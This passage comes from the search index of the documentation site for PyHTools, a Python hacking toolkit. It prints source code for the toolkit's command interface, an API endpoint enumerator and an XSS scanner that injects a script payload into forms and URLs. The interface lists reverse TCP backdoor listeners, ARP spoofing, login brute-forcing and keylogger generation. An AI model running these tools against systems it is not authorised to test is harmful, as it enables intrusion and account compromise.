+ f'| written by dmdhrumilmistry               |')\nprint(BRIGHT_YELLOW + '+' + '-'*42 + '+')\n</code></pre>"},{"location":"code-docs/ui-doc/#pyhtools.UI.functions.clrscr","title":"<code>clrscr()</code>","text":"<p>Clears UI screen</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\UI\\functions.py</code> <pre><code>def clrscr():\n'''Clears UI screen\n    Args:\n        None\n    Returns:\n        None\n    '''\nif os.name == 'nt':\nos.system('cls')\nelif os.name == 'posix':\nos.system('clear')\n</code></pre>"},{"location":"code-docs/ui-doc/#pyhtools.UI.functions.generate_executable","title":"<code>generate_executable()</code>","text":"<p>executes commands to generate executables. Work in Progress</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\UI\\functions.py</code> <pre><code>def generate_executable():\n'''executes commands to generate executables. Work in Progress\n    Args:\n        None\n    Returns:\n        None\n    '''\nprint(BRIGHT_YELLOW +\n'[-] Currently this feature is under test... Will update soon...')\nprint(BRIGHT_WHITE +\n'[*] You can use scripts from malwares to manually generate evil files...')\n</code></pre>"},{"location":"code-docs/ui-doc/#pyhtools.UI.functions.listener_option","title":"<code>listener_option()</code>","text":"<p>accepts inputs from user to run reverse TCP backdoor and starts listeners</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\UI\\functions.py</code> <pre><code>def listener_option():\n'''accepts inputs from user to run reverse TCP backdoor and starts listeners\n    Args:\n        None\n    Returns:\n        None\n    '''\nhost = input('[+] LHOST : ')\nport = int(input('[+] LPORT : '))\nlsnr = listener.Listener(host, port)\nlsnr.run()\n</code></pre>"},{"location":"code-docs/ui-doc/#pyhtools.UI.functions.machngr_option","title":"<code>machngr_option()</code>","text":"<p>executes commands to change mac address</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\UI\\functions.py</code> <pre><code>def machngr_option():\n'''executes commands to change mac address\n    Args:\n        None\n    Returns:\n        None\n    '''\nattacker.mac_changer()\n</code></pre>"},{"location":"code-docs/ui-doc/#pyhtools.UI.functions.print_help","title":"<code>print_help()</code>","text":"<p>prints commands with their brief description.</p> Source code in <code>pyhtools\\UI\\functions.py</code> <pre><code>def print_help():\n'''\n    prints commands with their brief description.\n    '''\nprint(BRIGHT_WHITE + 'Python Hacking Tools (PyHTools) (pht)')\nhelp = PrettyTable(['Command', 'Description'])\nhelp.align['Command'] = 'c'\nhelp.align['Description'] = 'l'\n# help.add_row(['',''])\nhelp.add_row(['clear', 'clear console'])\nhelp.add_row(['help', 'display help table'])\nhelp.add_row(['close', 'exit PyHackingTools'])\nhelp.add_row(['machngr', 'change mac address of the network interface'])\nhelp.add_row(['arpspoofer', 'spoof the target by arp poisoning'])\nhelp.add_row(['nwscan', 'scan for ip range in the network'])\nhelp.add_row(\n['webspider', 'maps all the links which are related to root url on the website'])\nhelp.add_row(\n['webcrawldirs', 'scan for valid directories of the website using a wordlist'])\nhelp.add_row(\n['webcrawlsubdom', 'scan for valid subdomains of the website using a wordlist'])\nhelp.add_row(['weblogin', 'bruteforce webpage login'])\nhelp.add_row(['webvulnscan', 'scan for vulnerabilities on the website'])\n# help.add_row(['',''])\nhelp.add_row(['listener', 'start reverse TCP listener on specific LHOST and LPORT'])\nhelp.add_row(['sendmail', 'send mail to specific email address'])\nhelp.add_row(\n['gen exe', 'generate executables of reverse backdoor, keylogger, etc.'])\nprint(help)\n</code></pre>"},{"location":"code-docs/ui-doc/#pyhtools.UI.functions.run","title":"<code>run()</code>  <code>async</code>","text":"<p>starts PyHTools UI, interacts with user and executes appropriate  functions based on command </p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\UI\\functions.py</code> <pre><code>async def run():\n'''starts PyHTools UI, interacts with user and executes appropriate \n    functions based on command \n    Args:\n        None\n    Returns:\n        None\n    '''\ntry:\nwhile True:\ncmd = input(BRIGHT_RED + 'pyhtools &gt;&gt;' +\nRESET_COLORS + ' ').lower().strip()\n# BASIC UI COMMANDS\nif cmd == 'close':\nbreak\nelif cmd == 'clear':\nclrscr()\nelif cmd == 'help':\nprint_help()\n# MALWARES\nelif cmd == 'listener':\nlistener_option()\nelif cmd == 'sendmail':\nsendmail_option()\nelif cmd == 'gen exe':\ngenerate_executable()\n# NETWORK ATTACKERS\nelif cmd == 'machngr':\nmachngr_option()\nelif cmd == 'arpspoofer':\nattacker.arpspoofer()\nelif cmd == 'nwscan':\nattacker.nw_scan()\n# WEB ATTACKERS\nelif cmd == 'webspider':\nawait attacker.webspider()\nelif cmd == 'webcrawldirs':\nawait attacker.webcrawldirs()\nelif cmd == 'webcrawlsubdom':\nawait attacker.webcrawlsubdom()\nelif cmd == 'weblogin':\nattacker.brute_login()\nelif cmd == 'webvulnscan':\nattacker.webvulnscan()\nelse:\nprint(BRIGHT_RED +\n'[-] Unknown command, use help to view valid commands')\nexcept (EOFError, KeyboardInterrupt, CancelledError):\nprint()\nprint(BRIGHT_YELLOW +\n\"[\\U0001f604] WE ARE NEVER RESPONSIBLE FOR YOUR ACTIONS!\")\nprint(BRIGHT_RED + '[-] Closing PHT....')\nsys.exit(0)\n</code></pre>"},{"location":"code-docs/ui-doc/#pyhtools.UI.functions.send_mail_to","title":"<code>send_mail_to(email, password, receiver, subject, body)</code>","text":"<p>sends mail to receivers</p> <p>Parameters:</p> Name Type Description Default <code>email</code> <code>str</code> <p>email of the sender</p> required <code>password</code> <code>str</code> <p>password of sender</p> required <code>receiver</code> <code>str</code> <p>receviever's email address</p> required <code>subject</code> <code>str</code> <p>email subject</p> required <code>body</code> <code>str</code> <p>email text content</p> required <p>Returns:</p> Name Type Description <code>bool</code> <code>bool</code> <p>returns True if email was sent successfully, else returns False</p> Source code in <code>pyhtools\\UI\\functions.py</code> <pre><code>def send_mail_to(email, password, receiver, subject, body) -&gt; bool:\n'''sends mail to receivers\n    Args:\n        email (str): email of the sender\n        password (str): password of sender\n        receiver (str): receviever's email address\n        subject (str): email subject\n        body (str): email text content\n    Returns:\n        bool: returns True if email was sent successfully, else returns False\n    '''\nprint(BRIGHT_WHITE + '[*] Sending email...')\nmsg = f'Subject: {subject}\\n{body}'\nif send_mail(email, receiver, password, msg):\nprint(BRIGHT_YELLOW + '[\\u2714] Mail Sent')\nelse:\nprint(BRIGHT_RED + '[\\u274c] Unable to send mail.')\n</code></pre>"},{"location":"code-docs/ui-doc/#pyhtools.UI.functions.sendmail_option","title":"<code>sendmail_option()</code>","text":"<p>Accepts inputs from user to send email</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\UI\\functions.py</code> <pre><code>def sendmail_option():\n'''Accepts inputs from user to send email\n    Args:\n        None\n    Returns:\n        None\n    '''\nemail = input('[+] gmail acc : ')\npassword = input('[+] password : ')\nprint('[!] if you want to send mail to yourself enter \"self\" (without quotes)')\nreceiver = input('[+] email to : ')\nif receiver.lower() == 'self':\nreceiver = email\nsubject = input('[+] subject : ')\nbody = input('[+] body : ')\nsend_mail_to(email, password, receiver, subject, body)\n</code></pre>"},{"location":"code-docs/web-attackers/","title":"Web Attackers Documentation","text":""},{"location":"code-docs/web-attackers/#api","title":"API","text":""},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.api.discover.APIdiscover","title":"<code>APIdiscover</code>","text":"<p>Class to discover API endpoints</p> Source code in <code>pyhtools\\attackers\\web\\api\\discover.py</code> <pre><code>class APIdiscover:\n'''\n    Class to discover API endpoints\n    '''\ndef __init__(self, base_url: str, match_codes: list[int], rate_limit: int = 20, delay: float = 0.05, output_file_path: str = None, headers: dict = None) -&gt; None:\n'''APIdiscover constructor\n        Args:\n            base_url (str): weburl of API  \n            match_codes (list): list of integer containing HTTP response status codes, which detects that endpoint exists\n            rate_limit (int): number of concurrent requests at the same time\n            delay (float): delay between consecutive requests\n            output_file_path (str): file path to store results in json format\n            headers (dict): overrides default headers while sending HTTP requests\n        Returns:\n            None\n        '''\nassert isinstance(base_url, str)\nassert isinstance(match_codes, list)\nassert isinstance(rate_limit, int)\nassert isinstance(delay, float)\nself.base_url = base_url\nself.output_file_path = output_file_path\nself.match_codes = match_codes\nself._delay = delay\nself._semaphore = asyncio.Semaphore(rate_limit)\nself._headers = headers\nasync def check_endpoint(self, endpoint: str) -&gt; dict:\n'''checks if endpoint is valid or not using HTTP Get request\n        returns dict containing endpoint information\n        Args: \n            endpoint(str): api endpoint\n        Returns: \n            dict: contains HTTP request and response data\n        '''\nassert isinstance(endpoint, str)\nurl = urljoin(self.base_url, endpoint)\nasync with self._semaphore:\nasync with ClientSession(headers=self._headers) as session:\nasync with session.get(url) as response:\nif response.status in self.match_codes:\nlogger.info(f'{endpoint}\\t{response.status}')\nlogger.debug(f'{url}\\t{response.status}')\nawait asyncio.sleep(self._delay)\nreturn {\n\"endpoint\": endpoint,\n\"status\": response.status,\n\"req_url\": str(response.request_info.real_url),\n\"req_method\": response.request_info.method,\n\"req_headers\": dict(**response.request_info.headers),\n\"res_redirection\": str(response.history),\n\"res_headers\": dict(response.headers),\n\"res_body\": (await response.read()).decode('utf-8'),\n}\nasync def get_endpoints_from_file(self, wordlist_path: str):\n'''reads endpoints from wordlist file and returns as a list\n        Args:\n            wordlist_path (str): path of wordlist file\n        Returns:\n            list: list of str containing endpoints\n        '''\nassert isinstance(wordlist_path, str) and isfile(wordlist_path)\nendpoints = None\nwith open(wordlist_path, 'r') as f:\nendpoints = [str(endpoint).strip() for endpoint in f.readlines()]\nreturn endpoints\nasync def save_result_to_file(self, results: list[dict], file_path: str,):\n'''stores json result to file\n        Args:\n            file_path (str): path to output file\n            results (list): list of HTTP response (dict) \n        Returns:\n            bool: returns True if file was saved else False in case \n            of any exception\n        '''\nassert isinstance(results, list)\nassert isinstance(file_path, str)\nsave_status = False\nwith open(file_path, 'w') as f:\ntry:\nf.write(to_json(results))\nsave_status = True\nlogger.info(f'results stored in {file_path}')\nexcept JSONDecodeError:\nlogger.error(\nf'Invalid json data, Failed to store data in {file_path}')\nreturn save_status\nasync def start_enum_from_file(self, wordlist_file: str):\n'''\n        start endpoint enumeration using wordlist\n        Args:\n            wordlist_file(str): path of wordlist file\n        Returns:\n            None\n        '''\nendpoints = await self.get_endpoints_from_file(wordlist_file)\nresults = await self.enumerate(endpoints=endpoints)\nif self.output_file_path:\nawait self.save_result_to_file(\nresults=results,\nfile_path=self.output_file_path,\n)\nasync def start_enum_id(self, ending_id: int, param_name: str, starting_id: int = 0):\n'''starts enumeration based on id in GET request\n        Args:\n            ending_id (int): object id after which enumeration should stop\n            param_name (str): GET param\n            starting_id (int): object id from which enumeration should start\n        Returns:\n            None\n        '''\nassert isinstance(starting_id, int)\nassert isinstance(ending_id, int)\nassert isinstance(param_name, str)\nendpoints = [f'{self.base_url}{param_name}={id_val}' for id_val in range(starting_id, ending_id)]\nresults = await self.enumerate(endpoints=endpoints)\nif self.output_file_path:\nawait self.save_result_to_file(\nresults=results,\nfile_path=self.output_file_path,\n)\nasync def enumerate(self, endpoints: list):\n'''start API enumeration and return captured responses as list\n        Args:\n            endpoints (list): contains list of endpoints as str\n        Returns:\n            results (list): list of results containing dict of \n            endpoint information\n        '''\nassert isinstance(endpoints, list)\ntasks = []\nfor endpoint in endpoints:\ntasks.append(\nasyncio.ensure_future(\nself.check_endpoint(endpoint=endpoint)\n)\n)\nresults = await asyncio.gather(*tasks)\nreturn results\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.api.discover.APIdiscover.__init__","title":"<code>__init__(base_url, match_codes, rate_limit=20, delay=0.05, output_file_path=None, headers=None)</code>","text":"<p>APIdiscover constructor</p> <p>Parameters:</p> Name Type Description Default <code>base_url</code> <code>str</code> <p>weburl of API  </p> required <code>match_codes</code> <code>list</code> <p>list of integer containing HTTP response status codes, which detects that endpoint exists</p> required <code>rate_limit</code> <code>int</code> <p>number of concurrent requests at the same time</p> <code>20</code> <code>delay</code> <code>float</code> <p>delay between consecutive requests</p> <code>0.05</code> <code>output_file_path</code> <code>str</code> <p>file path to store results in json format</p> <code>None</code> <code>headers</code> <code>dict</code> <p>overrides default headers while sending HTTP requests</p> <code>None</code> <p>Returns:</p> Type Description <code>None</code> <p>None</p> Source code in <code>pyhtools\\attackers\\web\\api\\discover.py</code> <pre><code>def __init__(self, base_url: str, match_codes: list[int], rate_limit: int = 20, delay: float = 0.05, output_file_path: str = None, headers: dict = None) -&gt; None:\n'''APIdiscover constructor\n    Args:\n        base_url (str): weburl of API  \n        match_codes (list): list of integer containing HTTP response status codes, which detects that endpoint exists\n        rate_limit (int): number of concurrent requests at the same time\n        delay (float): delay between consecutive requests\n        output_file_path (str): file path to store results in json format\n        headers (dict): overrides default headers while sending HTTP requests\n    Returns:\n        None\n    '''\nassert isinstance(base_url, str)\nassert isinstance(match_codes, list)\nassert isinstance(rate_limit, int)\nassert isinstance(delay, float)\nself.base_url = base_url\nself.output_file_path = output_file_path\nself.match_codes = match_codes\nself._delay = delay\nself._semaphore = asyncio.Semaphore(rate_limit)\nself._headers = headers\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.api.discover.APIdiscover.check_endpoint","title":"<code>check_endpoint(endpoint)</code>  <code>async</code>","text":"<p>checks if endpoint is valid or not using HTTP Get request returns dict containing endpoint information</p> <p>Parameters:</p> Name Type Description Default <code>endpoint(str)</code> <p>api endpoint</p> required <p>Returns:</p> Name Type Description <code>dict</code> <code>dict</code> <p>contains HTTP request and response data</p> Source code in <code>pyhtools\\attackers\\web\\api\\discover.py</code> <pre><code>async def check_endpoint(self, endpoint: str) -&gt; dict:\n'''checks if endpoint is valid or not using HTTP Get request\n    returns dict containing endpoint information\n    Args: \n        endpoint(str): api endpoint\n    Returns: \n        dict: contains HTTP request and response data\n    '''\nassert isinstance(endpoint, str)\nurl = urljoin(self.base_url, endpoint)\nasync with self._semaphore:\nasync with ClientSession(headers=self._headers) as session:\nasync with session.get(url) as response:\nif response.status in self.match_codes:\nlogger.info(f'{endpoint}\\t{response.status}')\nlogger.debug(f'{url}\\t{response.status}')\nawait asyncio.sleep(self._delay)\nreturn {\n\"endpoint\": endpoint,\n\"status\": response.status,\n\"req_url\": str(response.request_info.real_url),\n\"req_method\": response.request_info.method,\n\"req_headers\": dict(**response.request_info.headers),\n\"res_redirection\": str(response.history),\n\"res_headers\": dict(response.headers),\n\"res_body\": (await response.read()).decode('utf-8'),\n}\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.api.discover.APIdiscover.enumerate","title":"<code>enumerate(endpoints)</code>  <code>async</code>","text":"<p>start API enumeration and return captured responses as list</p> <p>Parameters:</p> Name Type Description Default <code>endpoints</code> <code>list</code> <p>contains list of endpoints as str</p> required <p>Returns:</p> Name Type Description <code>results</code> <code>list</code> <p>list of results containing dict of </p> <p>endpoint information</p> Source code in <code>pyhtools\\attackers\\web\\api\\discover.py</code> <pre><code>async def enumerate(self, endpoints: list):\n'''start API enumeration and return captured responses as list\n    Args:\n        endpoints (list): contains list of endpoints as str\n    Returns:\n        results (list): list of results containing dict of \n        endpoint information\n    '''\nassert isinstance(endpoints, list)\ntasks = []\nfor endpoint in endpoints:\ntasks.append(\nasyncio.ensure_future(\nself.check_endpoint(endpoint=endpoint)\n)\n)\nresults = await asyncio.gather(*tasks)\nreturn results\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.api.discover.APIdiscover.get_endpoints_from_file","title":"<code>get_endpoints_from_file(wordlist_path)</code>  <code>async</code>","text":"<p>reads endpoints from wordlist file and returns as a list</p> <p>Parameters:</p> Name Type Description Default <code>wordlist_path</code> <code>str</code> <p>path of wordlist file</p> required <p>Returns:</p> Name Type Description <code>list</code> <p>list of str containing endpoints</p> Source code in <code>pyhtools\\attackers\\web\\api\\discover.py</code> <pre><code>async def get_endpoints_from_file(self, wordlist_path: str):\n'''reads endpoints from wordlist file and returns as a list\n    Args:\n        wordlist_path (str): path of wordlist file\n    Returns:\n        list: list of str containing endpoints\n    '''\nassert isinstance(wordlist_path, str) and isfile(wordlist_path)\nendpoints = None\nwith open(wordlist_path, 'r') as f:\nendpoints = [str(endpoint).strip() for endpoint in f.readlines()]\nreturn endpoints\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.api.discover.APIdiscover.save_result_to_file","title":"<code>save_result_to_file(results, file_path)</code>  <code>async</code>","text":"<p>stores json result to file</p> <p>Parameters:</p> Name Type Description Default <code>file_path</code> <code>str</code> <p>path to output file</p> required <code>results</code> <code>list</code> <p>list of HTTP response (dict) </p> required <p>Returns:</p> Name Type Description <code>bool</code> <p>returns True if file was saved else False in case </p> <p>of any exception</p> Source code in <code>pyhtools\\attackers\\web\\api\\discover.py</code> <pre><code>async def save_result_to_file(self, results: list[dict], file_path: str,):\n'''stores json result to file\n    Args:\n        file_path (str): path to output file\n        results (list): list of HTTP response (dict) \n    Returns:\n        bool: returns True if file was saved else False in case \n        of any exception\n    '''\nassert isinstance(results, list)\nassert isinstance(file_path, str)\nsave_status = False\nwith open(file_path, 'w') as f:\ntry:\nf.write(to_json(results))\nsave_status = True\nlogger.info(f'results stored in {file_path}')\nexcept JSONDecodeError:\nlogger.error(\nf'Invalid json data, Failed to store data in {file_path}')\nreturn save_status\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.api.discover.APIdiscover.start_enum_from_file","title":"<code>start_enum_from_file(wordlist_file)</code>  <code>async</code>","text":"<p>start endpoint enumeration using wordlist</p> <p>Parameters:</p> Name Type Description Default <code>wordlist_file(str)</code> <p>path of wordlist file</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\web\\api\\discover.py</code> <pre><code>async def start_enum_from_file(self, wordlist_file: str):\n'''\n    start endpoint enumeration using wordlist\n    Args:\n        wordlist_file(str): path of wordlist file\n    Returns:\n        None\n    '''\nendpoints = await self.get_endpoints_from_file(wordlist_file)\nresults = await self.enumerate(endpoints=endpoints)\nif self.output_file_path:\nawait self.save_result_to_file(\nresults=results,\nfile_path=self.output_file_path,\n)\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.api.discover.APIdiscover.start_enum_id","title":"<code>start_enum_id(ending_id, param_name, starting_id=0)</code>  <code>async</code>","text":"<p>starts enumeration based on id in GET request</p> <p>Parameters:</p> Name Type Description Default <code>ending_id</code> <code>int</code> <p>object id after which enumeration should stop</p> required <code>param_name</code> <code>str</code> <p>GET param</p> required <code>starting_id</code> <code>int</code> <p>object id from which enumeration should start</p> <code>0</code> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\web\\api\\discover.py</code> <pre><code>async def start_enum_id(self, ending_id: int, param_name: str, starting_id: int = 0):\n'''starts enumeration based on id in GET request\n    Args:\n        ending_id (int): object id after which enumeration should stop\n        param_name (str): GET param\n        starting_id (int): object id from which enumeration should start\n    Returns:\n        None\n    '''\nassert isinstance(starting_id, int)\nassert isinstance(ending_id, int)\nassert isinstance(param_name, str)\nendpoints = [f'{self.base_url}{param_name}={id_val}' for id_val in range(starting_id, ending_id)]\nresults = await self.enumerate(endpoints=endpoints)\nif self.output_file_path:\nawait self.save_result_to_file(\nresults=results,\nfile_path=self.output_file_path,\n)\n</code></pre>"},{"location":"code-docs/web-attackers/#vuln-scanner","title":"Vuln Scanner","text":"<p>Module: sqli.py Author: dmdhrumilmistry Project: github.com/dmdhrumilmistry/pyhtools License: MIT</p>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.scanner.Scanner","title":"<code>Scanner</code>","text":"<p>Scans for vulnerabilities in the website</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\scanner.py</code> <pre><code>class Scanner:\n'''Scans for vulnerabilities in the website'''\ndef __init__(self, url:str, ignore_links:list) -&gt; None:\nself.target_url = url\nif ignore_links:\nself.ignore_links = ignore_links\nelse:\nself.ignore_links = []\nself.session = requests.Session()\nself.target_links = []\ndef get_links(self, url:str)-&gt;list:\n'''extracts links from the whole webpage.\n        Args:\n            url (str): URL of the webpage\n        Returns: \n            links (list): list of URLs present in the webpage\n        '''\nresponse = self.session.get(url)\ncontent = str(response.content)\nreturn re.findall(r'(?:href=\")(.*?)\"',content)\ndef get_target_links(self, url:str):\n'''extracts useful links and prints them which are\n        only related to the target webpage.\n        Args:\n            links (list):  list of links from the target webpage\n        Returns:\n            list: useful links as str related to target webpage\n        '''\nlinks = self.get_links(url)\nfor link in links:\nlink = urljoin(url, link)\nif '#' in link:\nlink = link.split('#')[0]\nif link not in self.target_links and self.target_url in link and link not in self.ignore_links:\nself.target_links.append(link)\nif requests.get(link).status_code==200:\nprint(link)\nself.get_target_links(link)\ndef remove_escape_seq(self, content:str)-&gt;str:\nr'''removes \\r \\t \\n from the html parsed content if present.\n        Args: \n            content (str): html page content as string\n        Returns: \n            str: escaped html content without \\r \\t \\n chars\n        '''\nreturn content.replace(r'\\n','').replace(r'\\t','').replace(r'\\r','').replace(r\"\\'\",\"'\")\ndef get_page_content(self, url:str)-&gt;str:\n'''extracts html code of the webpage\n        Args:\n            url (str): URL of the webpage\n        Returns:\n            str: Html content as string\n        '''\nresponse = self.session.get(url)\ncontent = str(response.content)\ncontent = self.remove_escape_seq(content)\nreturn content\ndef get_forms(self, url:str)-&gt;list:\n'''extracts all the forms on the url \n        webpage using beautiful soup 4\n        Args:\n            url (str): URL of webpage\n        Returns: \n            list: list of forms (bs4.element.ResultSet)\n        ''' \npage_content = self.get_page_content(url)\npage_content = self.remove_escape_seq(page_content)\npage_html = BeautifulSoup(page_content,'html.parser')\nreturn page_html.find_all(name='form')\ndef submit_form(self, form, value, url):\n'''submits form with passed value to url passed\n        Args: \n            form (dict): webpage form from bs4.element.ResultSet\n            value (str): Form input value to be used while filling form\n            url (str): base url of webpage\n        Returns: \n            str: html contents of the reponse\n        '''\naction = form.get('action')\npost_url = urljoin(url, action)\n# print(post_url)\nmethod = form.get('method')\npost_data_dict = {}\ninputs = form.find_all('input')\nfor input in inputs:\ninp_name = input.get('name') \ninp_type = input.get('type')\ninp_value = input.get('value')\nif inp_type == 'text':\ninp_value = value\npost_data_dict[inp_name]=inp_value\nif method == 'post':\npost_response = self.session.post(url=post_url, data=post_data_dict)\nelse:\npost_response = self.session.get(url=url, params=post_data_dict)\nreturn self.remove_escape_seq(str(post_response.content))\ndef is_xss_vulnerable_in_form(self, form, url)-&gt;bool:\n'''tests whether the passed form is xss vulnerable or not. \n        Args:\n            form (dict): webpage form from bs4.element.ResultSet\n            url (str): base url of webpage\n        Returns: \n            bool: returns True if vulnerable else False\n        '''\ntest_script_payload = \"&lt;scRipt&gt;alert('vulnerable')&lt;/sCript&gt;\"\nresponse_content = self.submit_form(form, test_script_payload, url)\n# response = BeautifulSoup(response_content, 'html.parser')\n# print(BRIGHT_YELLOW + '[-] RESPONSE: \\n', response.prettify())\nreturn test_script_payload in response_content\ndef is_xss_vulnerable_in_link(self, url, payload=None):\n'''tests whether the passed url is xss vulnerable or not. \n        Args:\n            url (str): base url of webpage\n            payload (str): XSS payload to be injected in URL during test\n        Returns: \n            bool: returns True if vulnerable else False\n        '''\nif payload is None:\npayload = \"&lt;scRipt&gt;alert('vulnerable')&lt;/sCript&gt;\"\nurl = url.replace('=',f'={payload}')\nresponse_content = self.get_page_content(url)\n# response = BeautifulSoup(response_content, 'html.parser')\n# print(BRIGHT_YELLOW + '[-] RESPONSE: \\n', response.prettify())\nreturn payload in response_content\ndef run(self):\n'''Starts the scanner\n        Args:\n            None\n        Returns: \n            None\n        '''\ntry:\ntry:\nprint(BRIGHT_WHITE + '[*] Spider is mapping website.')\nprint(BRIGHT_YELLOW + '[!] Press ctrl+c to stop mapping!')\nself.get_target_links(self.target_url)\nexcept KeyboardInterrupt:\nprint(BRIGHT_YELLOW + '\\r[!] ctrl+c detected! Stopping Spider. Website mapping stopped.')\nprint(BRIGHT_WHITE + '[*] Finding vulnerabilites on the mapped webpages.')\nforms = self.get_forms(self.target_url)\nfor link in self.target_links:\nforms = self.get_forms(link)\nfor form in forms:\nprint(BRIGHT_WHITE + '[*] Scanning/Testing vuln in form of link: ', link)\nif self.is_xss_vulnerable_in_form(form,link):\nprint(BRIGHT_YELLOW + f'[!] Found XSS vuln in {link} form : ')\nprint(form)\nprint()\nif \"=\" in link:\nprint(BRIGHT_WHITE + '[*] Scanning/Testing vuln from URL of link: ', link)\nif self.is_xss_vulnerable_in_link(link):\nprint(BRIGHT_YELLOW + '[!] Found XSS vuln in URL :', link)\nprint()\nexcept Exception as e:\nprint(BRIGHT_RED + f'[-] Exception : {e}')\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.scanner.Scanner.get_forms","title":"<code>get_forms(url)</code>","text":"<p>extracts all the forms on the url  webpage using beautiful soup 4</p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>URL of webpage</p> required <p>Returns:</p> Name Type Description <code>list</code> <code>list</code> <p>list of forms (bs4.element.ResultSet)</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\scanner.py</code> <pre><code>def get_forms(self, url:str)-&gt;list:\n'''extracts all the forms on the url \n    webpage using beautiful soup 4\n    Args:\n        url (str): URL of webpage\n    Returns: \n        list: list of forms (bs4.element.ResultSet)\n    ''' \npage_content = self.get_page_content(url)\npage_content = self.remove_escape_seq(page_content)\npage_html = BeautifulSoup(page_content,'html.parser')\nreturn page_html.find_all(name='form')\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.scanner.Scanner.get_links","title":"<code>get_links(url)</code>","text":"<p>extracts links from the whole webpage.</p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>URL of the webpage</p> required <p>Returns:</p> Name Type Description <code>links</code> <code>list</code> <p>list of URLs present in the webpage</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\scanner.py</code> <pre><code>def get_links(self, url:str)-&gt;list:\n'''extracts links from the whole webpage.\n    Args:\n        url (str): URL of the webpage\n    Returns: \n        links (list): list of URLs present in the webpage\n    '''\nresponse = self.session.get(url)\ncontent = str(response.content)\nreturn re.findall(r'(?:href=\")(.*?)\"',content)\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.scanner.Scanner.get_page_content","title":"<code>get_page_content(url)</code>","text":"<p>extracts html code of the webpage</p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>URL of the webpage</p> required <p>Returns:</p> Name Type Description <code>str</code> <code>str</code> <p>Html content as string</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\scanner.py</code> <pre><code>def get_page_content(self, url:str)-&gt;str:\n'''extracts html code of the webpage\n    Args:\n        url (str): URL of the webpage\n    Returns:\n        str: Html content as string\n    '''\nresponse = self.session.get(url)\ncontent = str(response.content)\ncontent = self.remove_escape_seq(content)\nreturn content\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.scanner.Scanner.get_target_links","title":"<code>get_target_links(url)</code>","text":"<p>extracts useful links and prints them which are only related to the target webpage.</p> <p>Parameters:</p> Name Type Description Default <code>links</code> <code>list</code> <p>list of links from the target webpage</p> required <p>Returns:</p> Name Type Description <code>list</code> <p>useful links as str related to target webpage</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\scanner.py</code> <pre><code>def get_target_links(self, url:str):\n'''extracts useful links and prints them which are\n    only related to the target webpage.\n    Args:\n        links (list):  list of links from the target webpage\n    Returns:\n        list: useful links as str related to target webpage\n    '''\nlinks = self.get_links(url)\nfor link in links:\nlink = urljoin(url, link)\nif '#' in link:\nlink = link.split('#')[0]\nif link not in self.target_links and self.target_url in link and link not in self.ignore_links:\nself.target_links.append(link)\nif requests.get(link).status_code==200:\nprint(link)\nself.get_target_links(link)\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.scanner.Scanner.is_xss_vulnerable_in_form","title":"<code>is_xss_vulnerable_in_form(form, url)</code>","text":"<p>tests whether the passed form is xss vulnerable or not. </p> <p>Parameters:</p> Name Type Description Default <code>form</code> <code>dict</code> <p>webpage form from bs4.element.ResultSet</p> required <code>url</code> <code>str</code> <p>base url of webpage</p> required <p>Returns:</p> Name Type Description <code>bool</code> <code>bool</code> <p>returns True if vulnerable else False</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\scanner.py</code> <pre><code>def is_xss_vulnerable_in_form(self, form, url)-&gt;bool:\n'''tests whether the passed form is xss vulnerable or not. \n    Args:\n        form (dict): webpage form from bs4.element.ResultSet\n        url (str): base url of webpage\n    Returns: \n        bool: returns True if vulnerable else False\n    '''\ntest_script_payload = \"&lt;scRipt&gt;alert('vulnerable')&lt;/sCript&gt;\"\nresponse_content = self.submit_form(form, test_script_payload, url)\n# response = BeautifulSoup(response_content, 'html.parser')\n# print(BRIGHT_YELLOW + '[-] RESPONSE: \\n', response.prettify())\nreturn test_script_payload in response_content\n</code></pre>"},{"location":"code-docs/web-attackers/#pyhtools.attackers.web.vuln_scanner.scanner.Scanner.is_xss_vulnerable_in_link","title":"<code>is_xss_vulnerable_in_link(url, payload=None)</code>","text":"<p>tests whether the passed url is xss vulnerable or not. </p> <p>Parameters:</p> Name Type Description Default <code>url</code> <code>str</code> <p>base url of webpage</p> required <code>payload</code> <code>str</code> <p>XSS payload to be injected in URL during test</p> <code>None</code> <p>Returns:</p> Name Type Description <code>bool</code> <p>returns True if vulnerable else False</p> Source code in <code>pyhtools\\attackers\\web\\vuln_scanner\\scanner.py</code> <pre><code>def is_xss_vulnerable_in_link(self, url, payload=None):\n'''tests whether the passed url is xss vulnerable or not. \n    Args:\n        url (str): base url of 